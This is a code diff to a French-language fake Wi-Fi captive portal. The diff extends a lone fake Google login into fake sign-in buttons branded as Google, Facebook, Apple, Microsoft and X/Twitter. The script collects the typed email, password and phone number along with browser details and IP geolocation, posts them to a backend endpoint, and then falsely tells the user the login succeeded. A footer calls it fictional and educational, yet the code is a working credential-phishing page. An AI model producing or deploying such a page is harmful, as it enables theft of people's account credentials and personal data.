@@ -70,7 +70,7 @@
       outline: none;
     }
 
-    .btn, .google-btn {
+    .btn, .provider-btn {
       width: 100%;
       padding: 12px;
       font-size: 14px;
@@ -78,7 +78,11 @@
       border-radius: 4px;
       cursor: pointer;
       transition: background-color 0.2s;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     .btn {
@@ -91,17 +95,7 @@
       background-color: #1765c1;
     }
 
-    .google-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      background-color: white;
-      border: 1px solid #dadce0;
-      color: #5f6368;
-    }
-
-    .google-btn img {
+    .provider-btn img {
       width: 18px;
       height: 18px;
     }
@@ -112,7 +106,7 @@
       margin-top: 24px;
     }
 
-    .google-form {
+    .provider-form {
       display: none;
       margin-top: 20px;
       animation: fadeIn 0.3s ease-in-out;
@@ -128,7 +122,7 @@
       h1 { font-size: 20px; }
       .subtext { font-size: 14px; }
       input { padding: 12px 10px; font-size: 14px; }
-      .btn, .google-btn { padding: 10px; font-size: 12px; }
+      .btn, .provider-btn { padding: 10px; font-size: 12px; }
       .note { font-size: 10px; }
     }
   </style>
@@ -139,33 +133,56 @@
     <h1>Connexion au Wi-Fi</h1>
     <div class="subtext">Choisissez une méthode pour accéder à Internet</div>
 
-    <button class="google-btn" onclick="showGoogleForm()">
+    <!-- Faux boutons de connexion -->
+    <button class="provider-btn" onclick="showForm('Google')">
       <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google logo">
       Se connecter avec Google
     </button>
 
-    <form id="google-login-form" class="google-form">
-      <input type="email" id="google-email" placeholder="Adresse e-mail Google" required />
-      <input type="password" id="google-password" placeholder="Mot de passe" required />
-      <input type="tel" id="google-phone" placeholder="Numéro de téléphone" required />
-      <button type="submit" class="btn">Connexion</button>
+    <button class="provider-btn" onclick="showForm('Facebook')">
+      <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" />
+      Se connecter avec Facebook
+    </button>
+
+    <button class="provider-btn" onclick="showForm('Apple')">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+      Se connecter avec Apple
+    </button>
+
+    <button class="provider-btn" onclick="showForm('Microsoft')">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+      Se connecter avec Microsoft
+    </button>
+
+    <button class="provider-btn" onclick="showForm('Twitter')">
+      <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg" alt="Twitter">
+      Se connecter avec X / Twitter
+    </button>
+
+    <form id="provider-form" class="provider-form">
+      <input type="email" id="email" placeholder="Adresse e-mail" required />
+      <input type="password" id="password" placeholder="Mot de passe" required />
+      <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
+      <button type="submit" class="btn">Continuer</button>
     </form>
 
-    <div class="note">* Ceci est un portail captif fictif – démonstration uniquement.</div>
+    <div class="note">* Ceci est un portail captif fictif à but pédagogique uniquement.</div>
   </div>
 
   <script>
     let sessionStart = Date.now();
+    let currentProvider = "Inconnu";
 
-    function showGoogleForm() {
-      document.getElementById("google-login-form").style.display = "block";
+    function showForm(provider) {
+      currentProvider = provider;
+      document.getElementById("provider-form").style.display = "block";
     }
 
-    document.getElementById("google-login-form").addEventListener("submit", async function (e) {
+    document.getElementById("provider-form").addEventListener("submit", async function (e) {
       e.preventDefault();
-      const email = document.getElementById("google-email").value;
-      const password = document.getElementById("google-password").value;
-      const phone = document.getElementById("google-phone").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const phone = document.getElementById("phone").value;
 
       const userAgent = navigator.userAgent;
       const lang = navigator.language;
@@ -175,11 +192,7 @@
       const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
 
       let geoInfo = {
-        ip: "Inconnu",
-        city: "Inconnue",
-        region: "Inconnue",
-        country: "Inconnu",
-        org: "Inconnu"
+        ip: "Inconnu", city: "Inconnue", region: "Inconnue", country: "Inconnu", org: "Inconnu"
       };
 
       try {
@@ -193,11 +206,11 @@
           org: data.org
         };
       } catch (err) {
-        console.error("Erreur IP/Géo :", err);
+        console.error("Erreur IP :", err);
       }
 
       const message = `
-🔐 Connexion Google Wi-Fi (factice)
+🔐 Connexion ${currentProvider} (factice)
 📧 Email : ${email}
 🔑 Mot de passe : ${password}
 📱 Téléphone : ${phone}
@@ -214,14 +227,15 @@
 🕓 Fuseau horaire : ${timezone}
       `;
 
+      // Envoi vers ton backend ou webhook
       fetch("/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: message })
       });
 
-      alert("Connexion en cours...");
-      document.getElementById("google-login-form").reset();
+      alert("Connexion réussie. Redirection en cours...");
+      document.getElementById("provider-form").reset();
     });
   </script>
 </body>
